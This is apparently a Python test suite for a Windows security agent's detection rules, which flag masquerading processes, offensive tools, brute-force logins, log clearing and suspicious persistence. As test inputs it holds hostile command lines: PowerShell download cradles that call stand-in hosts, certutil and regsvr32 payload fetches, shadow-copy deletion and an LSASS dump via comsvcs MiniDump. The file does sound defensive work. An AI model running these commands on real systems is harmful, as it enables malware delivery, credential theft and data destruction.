"""Règles de surveillance de l'agent Windows, testées sans Windows : les fonctions
pures et le moteur sont extraits de windows_agent_tray.py (qui ne s'importe pas
hors Windows : interface graphique, registre)."""
import ast
import collections
import json
import threading
import logging
import ntpath
import os
import re
import tempfile
import time
import unittest
from datetime import datetime

SOURCE = os.path.join(os.path.dirname(__file__), "..", "windows_agent_tray.py")
WANTED = {"_SEVERITY_ORDER", "_SCRIPT_HOSTS", "_DOCUMENT_APPS", "_CMDLINE_OF_INTEREST", "_SYSTEM_BINARIES",
          "_OFFENSIVE_TOOLS", "_CMDLINE_RULES", "_DOUBLE_EXTENSION", "_MONITOR_ALERT_TTL",
          "_suspicious_location", "_command_program", "_is_vendor_path", "_rate_command",
          "_persistence_severity", "_process_findings", "_Monitor",
          "_parse_event_xml", "_parse_task_xml", "_RateTracker", "_windows_log_findings", "_ADMIN_GROUP_SIDS",
          "_DOMAIN_ADMIN_RIDS", "_program_file", "_yara_skip", "_YARA_SEVERITIES", "_YaraEngine"}


def _load():
    tree = ast.parse(open(SOURCE, encoding="utf-8").read())
    nodes = [n for n in tree.body
             if (isinstance(n, (ast.FunctionDef, ast.ClassDef)) and n.name in WANTED)
             or (isinstance(n, ast.Assign) and any(getattr(t, "id", None) in WANTED for t in n.targets))]
    ns = {"os": os, "ntpath": ntpath, "re": re, "json": json, "time": time, "datetime": datetime,
          "collections": collections, "threading": threading, "_yara_mod": None,
          "logger": logging.getLogger("test"),
          "MONITOR_STATE_FILE": os.path.join(tempfile.mkdtemp(), "monitor-state.json")}
    exec(compile(ast.Module(body=nodes, type_ignores=[]), SOURCE, "exec"), ns)
    return ns


W = _load()
SYSROOT = r"C:\Windows"


def findings(name, image, parent="explorer.exe", parent_image="", cmd="", watchlist=()):
    return [(r, s) for r, s, _t, _e in W["_process_findings"](name, image, parent, parent_image, cmd,
                                                                list(watchlist), SYSROOT)]


class ProcessRulesTests(unittest.TestCase):
    def test_normal_processes_raise_nothing(self):
        self.assertEqual(findings("svchost.exe", r"C:\Windows\System32\svchost.exe", "services.exe"), [])
        self.assertEqual(findings("chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe"), [])
        self.assertEqual(findings("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                                  cmd="powershell.exe -NoProfile -Command Get-Date"), [])

    def test_masquerading_system_binary(self):
        self.assertIn(("masquerading_process", "critical"),
                      findings("svchost.exe", r"C:\Users\bob\AppData\Roaming\svchost.exe"))

    def test_offensive_tools(self):
        self.assertIn(("offensive_tool", "critical"), findings("mimikatz.exe", r"C:\Tools\mimikatz.exe"))
        self.assertIn(("offensive_tool", "high"), findings("nc64.exe", r"C:\x\nc64.exe"))

    def test_encoded_powershell_and_download_cradle(self):
        enc = "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi"
        self.assertIn(("suspicious_command", "high"), findings("powershell.exe", "", cmd=enc))
        cradle = "powershell IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')"
        self.assertIn(("suspicious_command", "high"), findings("powershell.exe", "", cmd=cradle))

    def test_ransomware_and_credential_theft(self):
        self.assertIn(("suspicious_command", "critical"),
                      findings("vssadmin.exe", "", cmd="vssadmin.exe Delete Shadows /All /Quiet"))
        self.assertIn(("suspicious_command", "critical"),
                      findings("rundll32.exe", r"C:\Windows\System32\rundll32.exe",
                               cmd=r"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\t\l.dmp full"))

    def test_lolbins(self):
        self.assertIn(("suspicious_command", "high"),
                      findings("certutil.exe", "", cmd="certutil -urlcache -split -f http://x/p.exe p.exe"))
        self.assertIn(("suspicious_command", "high"),
                      findings("regsvr32.exe", "", cmd="regsvr32 /s /n /u /i:http://x/f.sct scrobj.dll"))

    def test_office_document_spawns_shell(self):
        self.assertIn(("document_spawns_shell", "high"), findings("cmd.exe", "", parent="WINWORD.EXE"))

    def test_vulnerable_application_spawning_a_shell_is_critical(self):
        watch = [{"name": "Apache Tomcat", "match": ["apache", "tomcat"], "cves": ["CVE-2026-1111"]}]
        res = W["_process_findings"]("cmd.exe", "", "java.exe", r"C:\Program Files\Apache\Tomcat 9\bin\java.exe",
                                     "", watch, SYSROOT)
        rule, severity, title, extra = next(f for f in res if f[0] == "vulnerable_app_spawns_shell")
        self.assertEqual(severity, "critical")
        self.assertIn("CVE-2026-1111", title)
        self.assertEqual(extra["watchlist_match"], "Apache Tomcat")
        # même parent, mais l'enfant n'est pas un interpréteur : rien
        self.assertNotIn("vulnerable_app_spawns_shell",
                         [r for r, _ in findings("java.exe", "", "java.exe", r"C:\Apache\Tomcat\java.exe",
                                                 watchlist=watch)])

    def test_locations(self):
        self.assertIn(("suspicious_location", "high"), findings("a.exe", r"C:\Users\Public\a.exe"))
        self.assertIn(("suspicious_location", "low"), findings("setup.exe", r"C:\Users\bob\AppData\Local\Temp\setup.exe"))
        self.assertIn(("double_extension", "high"), findings("facture.pdf.exe", r"C:\Users\bob\Desktop\facture.pdf.exe"))


class PersistenceRatingTests(unittest.TestCase):
    def rate(self, command):
        severity, _ = W["_rate_command"](command)
        return W["_persistence_severity"](command, severity)

    def test_quoted_program_path(self):
        self.assertEqual(W["_command_program"](r'"C:\Program Files\Google\Update\GoogleUpdate.exe" /c'),
                         r"C:\Program Files\Google\Update\GoogleUpdate.exe")
        self.assertEqual(W["_command_program"](r"C:\Program Files\Foo\foo.exe -x"), r"C:\Program Files\Foo\foo.exe")

    def test_vendor_task_is_low_unknown_is_medium(self):
        self.assertEqual(self.rate(r'"C:\Program Files\Google\Update\GoogleUpdate.exe" /c'), "low")
        self.assertEqual(self.rate(r"D:\outils\sauvegarde.exe"), "medium")
        self.assertEqual(self.rate(r"C:\Users\bob\AppData\Roaming\upd.exe"), "medium")

    def test_suspicious_persistence_is_high(self):
        self.assertEqual(self.rate(r"powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"), "high")
        self.assertEqual(self.rate(r"C:\Users\bob\AppData\Local\Temp\x.exe"), "high")
        self.assertEqual(self.rate(r"C:\Users\Public\svc.exe"), "high")


class EngineTests(unittest.TestCase):
    def test_first_snapshot_is_a_baseline_then_only_changes(self):
        mon = W["_Monitor"]()
        self.assertIsNone(mon.diff("services", {"a": "1|x"}))
        self.assertEqual(mon.diff("services", {"a": "1|x", "b": "2|y"}), [("b", "2|y", None)])
        self.assertEqual(mon.diff("services", {"a": "1|z", "b": "2|y"}), [("a", "1|z", "1|x")])

    def test_same_alert_is_not_sent_twice(self):
        mon = W["_Monitor"]()
        self.assertIsNotNone(mon.event("r", "high", "t", "k"))
        self.assertIsNone(mon.event("r", "high", "t", "k"))

    def test_state_survives_restart(self):
        mon = W["_Monitor"]()
        mon.diff("admins", {"BOB": "1"})
        mon.event("r", "high", "t", "k2")
        mon.save()
        again = W["_Monitor"]()
        self.assertEqual(again.diff("admins", {"BOB": "1", "EVE": "1"}), [("EVE", "1", None)])
        self.assertIsNone(again.event("r", "high", "t", "k2"))


EVT = "http://schemas.microsoft.com/win/2004/08/events/event"


def event_xml(channel, event_id, record=1, **data):
    fields = "".join(f'<Data Name="{k.replace("_", " ") if k[0].isupper() and "_" in k else k}">{v}</Data>'
                     for k, v in data.items())
    return (f'<Event xmlns="{EVT}"><System><Provider Name="x"/><EventID>{event_id}</EventID>'
            f'<TimeCreated SystemTime="2026-10-30T12:00:00.0000000Z"/><EventRecordID>{record}</EventRecordID>'
            f'<Channel>{channel}</Channel><Computer>PC-01</Computer></System><EventData>{fields}</EventData></Event>')


class EventLogRulesTests(unittest.TestCase):
    def run_events(self, *xmls, watchlist=()):
        tracker, out = W["_RateTracker"](), []
        for i, xml in enumerate(xmls):
            ev = W["_parse_event_xml"](xml)
            out += W["_windows_log_findings"](ev, tracker, list(watchlist), SYSROOT, 1000.0 + i)
        return out

    def test_parse_event_xml_including_user_data(self):
        xml = (f'<Event xmlns="{EVT}"><System><EventID>1102</EventID><EventRecordID>77</EventRecordID>'
               f'<Channel>Security</Channel></System><UserData><LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">'
               f'<SubjectUserName>eve</SubjectUserName></LogFileCleared></UserData></Event>')
        ev = W["_parse_event_xml"](xml)
        self.assertEqual((ev["id"], ev["record"], ev["data"]["SubjectUserName"]), (1102, "77", "eve"))
        self.assertIsNone(W["_parse_event_xml"]("<pas du xml"))

    def test_brute_force_then_rdp_login(self):
        fails = [event_xml("Security", 4625, i, IpAddress="203.0.113.9", TargetUserName="admin", LogonType="10")
                 for i in range(12)]
        ok = event_xml("Security", 4624, 99, IpAddress="203.0.113.9", TargetUserName="admin", LogonType="10")
        rules = [(f[0], f[1]) for f in self.run_events(*fails, ok)]
        self.assertIn(("brute_force", "high"), rules)
        self.assertIn(("login_after_failures", "critical"), rules)

    def test_scheduled_task_event_with_utf16_declaration(self):
        content = ('<?xml version="1.0" encoding="UTF-16"?><Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
                   '<Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi</Arguments>'
                   '</Exec></Actions></Task>')
        from xml.sax.saxutils import escape
        found = self.run_events(event_xml("Security", 4698, TaskName="\\Updater", TaskContent=escape(content)))
        self.assertEqual((found[0][0], found[0][1]), ("new_scheduled_task", "high"))
        self.assertTrue(found[0][3].startswith("task|Updater|powershell.exe -w hidden"))   # même clé que le capteur

    def test_service_installed_from_temp(self):
        found = self.run_events(event_xml("System", 7045, ServiceName="upd",
                                          ImagePath="C:\\Users\\bob\\AppData\\Local\\Temp\\svc.exe"))
        self.assertEqual((found[0][0], found[0][1]), ("new_service", "high"))

    def test_powershell_script_block(self):
        found = self.run_events(event_xml("Microsoft-Windows-PowerShell/Operational", 4104,
                                          ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://x/a')"))
        self.assertEqual((found[0][0], found[0][1]), ("suspicious_script", "high"))

    def test_logs_cleared_and_defender(self):
        rules = {(f[0], f[1]) for f in self.run_events(
            event_xml("Security", 1102), event_xml("Microsoft-Windows-Windows Defender/Operational", 5001),
            event_xml("Microsoft-Windows-Windows Defender/Operational", 1116, **{"Threat_Name": "Trojan:Win32/X", "Severity_Name": "Severe"}))}
        self.assertTrue({("log_cleared", "critical"), ("defender_disabled", "high"),
                         ("defender_detection", "critical")} <= rules)

    def test_admin_group_change(self):
        found = self.run_events(event_xml("Security", 4732, TargetSid="S-1-5-32-544", TargetUserName="Administrateurs",
                                          MemberName="-", MemberSid="S-1-5-21-1-2-3-1105"))
        self.assertEqual((found[0][0], found[0][1]), ("admin_group_added", "high"))
        self.assertEqual(self.run_events(event_xml("Security", 4732, TargetSid="S-1-5-32-545", MemberSid="x")), [])

    def test_sysmon_process_creation_reuses_process_rules(self):
        found = self.run_events(event_xml("Microsoft-Windows-Sysmon/Operational", 1,
                                          Image="C:\\Windows\\System32\\cmd.exe", ParentImage="C:\\Office\\WINWORD.EXE",
                                          CommandLine="cmd /c whoami"))
        self.assertIn(("document_spawns_shell", "high"), [(f[0], f[1]) for f in found])

    def test_program_file_and_yara_exclusions(self):
        self.assertEqual(W["_program_file"]('"C:\\Tools\\a.exe" -x'), "C:\\Tools\\a.exe")
        self.assertEqual(W["_program_file"]("powershell -enc AAA"), "")
        self.assertTrue(W["_yara_skip"]("C:\\Windows\\System32\\kernel32.dll"))
        self.assertFalse(W["_yara_skip"]("C:\\Windows\\Temp\\x.exe"))
        self.assertFalse(W["_yara_skip"]("C:\\Users\\bob\\Downloads\\x.exe"))


if __name__ == "__main__":
    unittest.main()
